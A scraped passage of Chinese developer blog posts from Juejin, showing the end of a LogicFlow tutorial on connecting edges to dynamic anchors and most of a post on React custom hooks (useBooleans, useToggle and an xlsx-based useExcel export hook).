      <span class="hljs-keyword">if</span> (sourceAnchor.<span class="hljs-property">id</span> === id) <span class="hljs-keyword">return</span>;

      <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 2. 构造边数据</span>
        <span class="hljs-comment">// 注意：这里我们把终点 (endPoint) 强制设为当前鼠标/锚点的视觉位置 {x, y}</span>
        <span class="hljs-comment">// 而不是节点原本定义的静态锚点位置</span>
        <span class="hljs-keyword">const</span> edgeData = {
            <span class="hljs-attr">type</span>: <span class="hljs-string">"bezier"</span>, <span class="hljs-comment">// 贝塞尔曲线</span>
            <span class="hljs-attr">sourceNodeId</span>: sourceNode.<span class="hljs-property">id</span>,
            <span class="hljs-attr">sourceAnchorId</span>: sourceAnchor.<span class="hljs-property">id</span>,
            <span class="hljs-attr">targetNodeId</span>: nodeModel.<span class="hljs-property">id</span>,
            <span class="hljs-attr">targetAnchorId</span>: id,
            <span class="hljs-attr">startPoint</span>: { <span class="hljs-attr">x</span>: sourceAnchor.<span class="hljs-property">x</span>, <span class="hljs-attr">y</span>: sourceAnchor.<span class="hljs-property">y</span> },
            <span class="hljs-attr">endPoint</span>: { x, y }, <span class="hljs-comment">// &lt;--- ⏰关键！使用当前的动态坐标</span>
        };

        <span class="hljs-comment">// 3. 核心：手动调用 graphModel.addEdge 添加边</span>
        graphModel.<span class="hljs-title function_">addEdge</span>(edgeData);
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"手动连接失败"</span>, error);
      }
    }
  }
</code></pre>
<p>这样一来，当用户从一个节点拖拽连线到我们的动态锚点上松开鼠标时，就能精准地建立连接了！不管你的锚点 "跑" 到了哪里，连线都能准确追踪。🎯</p>
<h2 data-id="heading-7">总结</h2>
<p>通过这次改造，咱们的流程图编辑体验得到了"质"的飞跃体验：</p>
<ol>
<li><strong>灵动</strong>：锚点不再是死板的钉子，而是会互动的精灵。👻</li>
<li><strong>高效</strong>：增大了鼠标感应区域，用户连线更轻松，无需像素级瞄准。</li>
<li><strong>美观</strong>：平时隐藏，用时显现，保持了画布的整洁。</li>
</ol>
<p>希望这个方案能给正在使用 LogicFlow 的小伙伴们一些灵感吧！💡</p>
<br/>
<hr/>
<p><br/><br/></p>
<p>至此，本篇文章就写完啦，撒花撒花。</p>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b2198fba2b674f1b935a63e4abb3cbd7~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=90&amp;h=90&amp;s=8866&amp;e=png&amp;b=fcfcfc" alt="image.png" loading="lazy"/></p>
<p>希望本文对你有所帮助，如有任何疑问，期待你的留言哦。<br/>
老样子，点赞+评论=你会了，收藏=你精通了。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React自定义Hooks]]></title>    <link>https://juejin.cn/post/7589082912588611627</link>    <guid>https://juejin.cn/post/7589082912588611627</guid>    <pubDate>2025-12-29T10:25:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589082912588611627" data-draft-id="7589099845186437156" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React自定义Hooks"/> <meta itemprop="keywords" content="TypeScript,前端,React.js"/> <meta itemprop="datePublished" content="2025-12-29T10:25:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="王林不想说话"/> <meta itemprop="url" content="https://juejin.cn/user/2963939079754030"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React自定义Hooks
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2963939079754030/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    王林不想说话
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T10:25:50.000Z" title="Mon Dec 29 2025 10:25:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读19分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>自定义一些常见的hook，方便在工作中使用，以下内容都是本人工作中的使用经验，不足之处，欢迎指正</p>
<h3 data-id="heading-0">useBooleans</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> 切换true/false的公共hook
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Boolean</span>} initValue 默认值
 */</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UseBooleansActions</span> {
  <span class="hljs-attr">toggle</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 切换值</span>
  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">value: <span class="hljs-built_in">boolean</span></span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 设置值</span>
  <span class="hljs-attr">setTrue</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 设置为true</span>
  <span class="hljs-attr">setFalse</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 设置值为false</span>
  <span class="hljs-attr">reset</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 重置为初始值</span>
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">useBooleans</span>(<span class="hljs-params">initValue = <span class="hljs-literal">false</span></span>): [<span class="hljs-built_in">boolean</span>, <span class="hljs-title class_">UseBooleansActions</span>] {
  <span class="hljs-keyword">const</span> [value, setValue] = useState&lt;<span class="hljs-built_in">boolean</span>&gt;(initValue)

  <span class="hljs-comment">/** 切换值 */</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggle</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setValue</span>(<span class="hljs-function">(<span class="hljs-params">pre</span>) =&gt;</span> !pre)
  }

  <span class="hljs-comment">/** 设置值 */</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">set</span> = (<span class="hljs-params">value: <span class="hljs-built_in">boolean</span></span>) =&gt; {
    <span class="hljs-title function_">setValue</span>(value)
  }

  <span class="hljs-comment">/** 设置为true */</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">setTrue</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setValue</span>(<span class="hljs-literal">true</span>)
  }

  <span class="hljs-comment">/** 设置为false */</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">setFalse</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setValue</span>(<span class="hljs-literal">false</span>)
  }

  <span class="hljs-comment">/** 重置为初始值 */</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">reset</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setValue</span>(initValue)
  }

  <span class="hljs-keyword">return</span> [value, { toggle, set, setTrue, setFalse, reset }]
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useBooleans

<span class="hljs-comment">// 使用</span>
<span class="hljs-keyword">const</span> [booleanValue, { toggle, setTrue, setFalse, reset, set }] = <span class="hljs-title function_">useBooleans</span>(<span class="hljs-literal">true</span>)
</code></pre>
<h3 data-id="heading-1">useToggle</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useMemo, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// 定义操作方法的接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Actions</span>&lt;T, U&gt; {
  <span class="hljs-attr">toggle</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">value: T | U</span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">setLeft</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 设置为默认值</span>
  <span class="hljs-attr">setRight</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 设置为取反值</span>
}

<span class="hljs-keyword">function</span> useToggle&lt;T = <span class="hljs-built_in">boolean</span>&gt;(
  defaultValue?: T,
  reverseValue?: T,
): [T, <span class="hljs-title class_">Actions</span>&lt;T, T&gt;]

<span class="hljs-keyword">function</span> useToggle&lt;T, U&gt;(
  <span class="hljs-attr">defaultValue</span>: T,
  <span class="hljs-attr">reverseValue</span>: U,
): [T | U, <span class="hljs-title class_">Actions</span>&lt;T | U, T | U&gt;]

<span class="hljs-keyword">function</span> useToggle&lt;D, R&gt;(
  <span class="hljs-attr">defaultValue</span>: D = <span class="hljs-literal">false</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">unknown</span> <span class="hljs-keyword">as</span> D,
  reverseValue?: R,
) {
  <span class="hljs-comment">// 状态管理：支持默认值和取反值</span>
  <span class="hljs-keyword">const</span> [state, setState] = useState&lt;D | R&gt;(defaultValue)

  <span class="hljs-comment">// 计算实际的取反值（若未提供则使用布尔取反）</span>
  <span class="hljs-keyword">const</span> reverseValueOrigin =
    reverseValue === <span class="hljs-literal">undefined</span> ? !defaultValue : reverseValue

  <span class="hljs-comment">// 缓存操作方法避免重复创建</span>
  <span class="hljs-keyword">const</span> actions = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 核心切换逻辑：在默认值和取反值之间切换</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggle</span> = (<span class="hljs-params"/>) =&gt;
      <span class="hljs-title function_">setState</span>(
        <span class="hljs-function">(<span class="hljs-params">s</span>) =&gt;</span>
          (s === defaultValue ? reverseValueOrigin : defaultValue) <span class="hljs-keyword">as</span> D | R,
      )
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">set</span> = (<span class="hljs-params">value: D | R</span>) =&gt; <span class="hljs-title function_">setState</span>(value)
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">setLeft</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-title function_">setState</span>(defaultValue)
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">setRight</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-title function_">setState</span>(reverseValueOrigin <span class="hljs-keyword">as</span> D | R)

    <span class="hljs-keyword">return</span> { toggle, set, setLeft, setRight }
  }, [defaultValue, reverseValueOrigin])

  <span class="hljs-keyword">return</span> [state, actions]
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useToggle

<span class="hljs-comment">// 使用</span>
<span class="hljs-keyword">const</span> [toggleValue, { <span class="hljs-attr">toggle</span>: toggle1, <span class="hljs-attr">set</span>: set1, setLeft, setRight }] =
    useToggle&lt;<span class="hljs-string">'left'</span>, <span class="hljs-string">'right'</span>&gt;(<span class="hljs-string">'left'</span>, <span class="hljs-string">'right'</span>)
</code></pre>
<h3 data-id="heading-2">useExcel</h3>
<p>基于xlsx的一些常见的导入导出功能封装</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { getTypeOf, isAvailableArr } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/utils'</span>
<span class="hljs-keyword">import</span> { message } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> {
  <span class="hljs-title class_">BookType</span>,
  <span class="hljs-title class_">ColInfo</span>,
  <span class="hljs-title class_">Range</span>,
  <span class="hljs-title class_">RowInfo</span>,
  <span class="hljs-title class_">Sheet2JSONOpts</span>,
  <span class="hljs-title class_">WorkBook</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'xlsx'</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">XLSX</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'xlsx'</span>

<span class="hljs-comment">// 导出文件配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">IExportConfig</span> = {
  name?: <span class="hljs-built_in">string</span> <span class="hljs-comment">// 导出文件名称</span>
  bookType?: <span class="hljs-title class_">BookType</span> <span class="hljs-comment">// 导出文件类型</span>
  sheetName?: <span class="hljs-built_in">string</span> <span class="hljs-comment">// sheet名称</span>
  errorMsg?: <span class="hljs-built_in">string</span> <span class="hljs-comment">// 错误提示</span>
  headers?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; <span class="hljs-comment">// 自定义表头，导出的文件里面只有在定义中的字段，并且如果数据为空的话，只生成一个表头。示例：{id: 'ID', name: '链接名称', site_type: '官网类型'}</span>
  merges?: <span class="hljs-title class_">Range</span>[] <span class="hljs-comment">// 单元格合并</span>
  colInfo?: <span class="hljs-title class_">ColInfo</span>[] <span class="hljs-comment">// 列属性</span>
  rowInfo?: <span class="hljs-title class_">RowInfo</span>[] <span class="hljs-comment">// 行属性</span>
}

<span class="hljs-comment">// 多sheet导出</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">IExtraSheetConfig</span> = {
  name?: <span class="hljs-built_in">string</span> <span class="hljs-comment">// 导出文件名称</span>
  bookType?: <span class="hljs-title class_">BookType</span> <span class="hljs-comment">// 导出文件类型</span>
  <span class="hljs-attr">sheets</span>: ({ <span class="hljs-attr">json</span>: <span class="hljs-built_in">any</span>[] } &amp; <span class="hljs-title class_">Omit</span>&lt;<span class="hljs-title class_">IExportConfig</span>, <span class="hljs-string">'name'</span> | <span class="hljs-string">'bookType'</span>&gt;)[]
}

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@desc</span> 自定义导出文件hook
 */</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">useExcel</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 一维数组导出Excel文件
   *
   * 此函数将一个一维数组转换为Excel文件并下载
   * 支持自定义表头、单元格合并、列属性和行属性
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any[]</span>} <span class="hljs-variable">json</span> - 要导出的数据数组
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">IExportConfig</span>} <span class="hljs-variable">config</span> - 导出配置项
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.name='导出'] - 导出文件名称
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">BookType</span>} [config.bookType='xlsx'] - 导出文件类型
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.sheetName='Sheet1'] - 工作表名称
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Record&lt;string, string&gt;</span>} [config.headers] - 自定义表头映射
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Range[]</span>} [config.merges] - 单元格合并范围
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ColInfo[]</span>} [config.colInfo] - 列属性配置
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">RowInfo[]</span>} [config.rowInfo] - 行属性配置
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">void</span>}
   */</span>
  <span class="hljs-keyword">function</span> exportJson2Excel&lt;T = <span class="hljs-built_in">any</span>&gt;(<span class="hljs-attr">json</span>: T[], config?: <span class="hljs-title class_">IExportConfig</span>) {
    <span class="hljs-keyword">const</span> {
      name = <span class="hljs-string">'导出'</span>,
      sheetName = <span class="hljs-string">'Sheet1'</span>,
      bookType = <span class="hljs-string">'xlsx'</span>,
      headers,
      merges,
      colInfo,
      rowInfo,
    } = config || {}
    <span class="hljs-keyword">let</span> lists = [...json]
    <span class="hljs-keyword">if</span> (
      headers &amp;&amp;
      <span class="hljs-title function_">getTypeOf</span>(headers) === <span class="hljs-string">'Object'</span> &amp;&amp;
      <span class="hljs-title function_">isAvailableArr</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(headers))
    ) {
      <span class="hljs-comment">// 没有数据的时候用header去生成一个空表头</span>
      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isAvailableArr</span>(lists)) {
        <span class="hljs-keyword">const</span> headersField = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(headers)
        <span class="hljs-keyword">const</span> <span class="hljs-attr">headerObj</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = {}
        headersField.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">f</span>) =&gt;</span> {
          headerObj[f] = <span class="hljs-literal">null</span>
        })
        lists = [headerObj <span class="hljs-keyword">as</span> T]
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 有数据的时候根据header去生成</span>
        <span class="hljs-keyword">const</span> headerFields = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(headers)
        lists = json.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">j</span>) =&gt;</span> {
          <span class="hljs-keyword">const</span> <span class="hljs-attr">obj</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = {}
          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> headerFields) {
            obj[value] = j[key <span class="hljs-keyword">as</span> keyof T] ?? <span class="hljs-literal">null</span>
          }
          <span class="hljs-keyword">return</span> obj
        }) <span class="hljs-keyword">as</span> T[]
      }
    }

    <span class="hljs-keyword">const</span> wb = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">book_new</span>()
    <span class="hljs-keyword">const</span> ws = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">json_to_sheet</span>(lists)
    <span class="hljs-keyword">if</span> (merges) {
      ws[<span class="hljs-string">'!merges'</span>] = merges
    }
    <span class="hljs-keyword">if</span> (colInfo) {
      ws[<span class="hljs-string">'!cols'</span>] = colInfo
    }
    <span class="hljs-keyword">if</span> (rowInfo) {
      ws[<span class="hljs-string">'!rows'</span>] = rowInfo
    }
    <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">book_append_sheet</span>(wb, ws, sheetName)
    <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">writeFile</span>(wb, <span class="hljs-string">`<span class="hljs-subst">${name}</span>.<span class="hljs-subst">${bookType}</span>`</span>, { bookType })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 一维数组多sheet导出Excel文件
   *
   * 此函数将多个一维数组分别放在不同的工作表中导出为一个Excel文件
   * 支持自定义表头、单元格合并、列属性和行属性
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">IExtraSheetConfig</span>} <span class="hljs-variable">params</span> - 多sheet导出配置项
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [params.name='导出'] - 导出文件名称
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">BookType</span>} [params.bookType='xlsx'] - 导出文件类型
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Array</span>} params.sheets - 工作表配置数组
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any[]</span>} params.sheets[].json - 要导出的数据数组
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [params.sheets[].sheetName] - 工作表名称
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Record&lt;string, string&gt;</span>} [params.sheets[].headers] - 自定义表头映射
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Range[]</span>} [params.sheets[].merges] - 单元格合并范围
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ColInfo[]</span>} [params.sheets[].colInfo] - 列属性配置
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">RowInfo[]</span>} [params.sheets[].rowInfo] - 行属性配置
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">void</span>}
   */</span>
  <span class="hljs-keyword">function</span> exportJson2ExcelSheets&lt;T = <span class="hljs-built_in">any</span>&gt;(<span class="hljs-attr">params</span>: <span class="hljs-title class_">IExtraSheetConfig</span>) {
    <span class="hljs-keyword">const</span> { name = <span class="hljs-string">'导出'</span>, bookType = <span class="hljs-string">'xlsx'</span>, sheets } = params || {}
    <span class="hljs-keyword">const</span> wb = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">book_new</span>()
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isAvailableArr</span>(sheets)) {
      sheets?.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">s</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> { json, headers, merges, colInfo, rowInfo, sheetName } = s || {}
        <span class="hljs-keyword">let</span> lists = [...json]
        <span class="hljs-keyword">if</span> (
          headers &amp;&amp;
          <span class="hljs-title function_">getTypeOf</span>(headers) === <span class="hljs-string">'Object'</span> &amp;&amp;
          <span class="hljs-title function_">isAvailableArr</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(headers))
        ) {
          <span class="hljs-comment">// 没有数据的时候用header去生成一个空表头</span>
          <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isAvailableArr</span>(lists)) {
            <span class="hljs-keyword">const</span> headersField = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(headers)
            <span class="hljs-keyword">const</span> <span class="hljs-attr">headerObj</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = {}
            headersField.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">f</span>) =&gt;</span> {
              headerObj[f] = <span class="hljs-literal">null</span>
            })
            lists = [headerObj <span class="hljs-keyword">as</span> T]
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 有数据的时候根据header去生成</span>
            <span class="hljs-keyword">const</span> headerFields = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(headers)
            lists = json.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">j</span>) =&gt;</span> {
              <span class="hljs-keyword">const</span> <span class="hljs-attr">obj</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = {}
              <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> headerFields) {
                obj[value] = j[key] ?? <span class="hljs-literal">null</span>
              }
              <span class="hljs-keyword">return</span> obj
            }) <span class="hljs-keyword">as</span> T[]
          }
        }

        <span class="hljs-keyword">const</span> ws = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">json_to_sheet</span>(lists)
        <span class="hljs-keyword">if</span> (merges) {
          ws[<span class="hljs-string">'!merges'</span>] = merges
        }
        <span class="hljs-keyword">if</span> (colInfo) {
          ws[<span class="hljs-string">'!cols'</span>] = colInfo
        }
        <span class="hljs-keyword">if</span> (rowInfo) {
          ws[<span class="hljs-string">'!rows'</span>] = rowInfo
        }
        <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">book_append_sheet</span>(wb, ws, sheetName)
      })
    } <span class="hljs-keyword">else</span> {
